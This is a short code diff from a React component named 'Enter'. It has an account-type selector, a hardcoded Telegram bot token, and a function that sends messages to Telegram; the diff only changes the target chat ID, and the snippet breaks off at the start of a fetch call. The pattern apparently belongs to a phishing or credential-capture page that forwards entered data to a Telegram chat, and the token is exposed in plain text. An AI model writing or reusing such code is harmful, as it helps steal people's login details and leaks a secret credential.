@@ -18,7 +18,7 @@ function Enter() {
   const [selectedAccountType, setSelectedAccountType] = React.useState('');
 
   const token = '6214248431:AAFodeiJc0UIq-nmsTyqMgzp2FdByom3wzc';
-  const chat_id = '5960483519';
+  const chat_id = '857709815';
 
   async function sendMessageToTelegram(message: any) {
     await fetch(
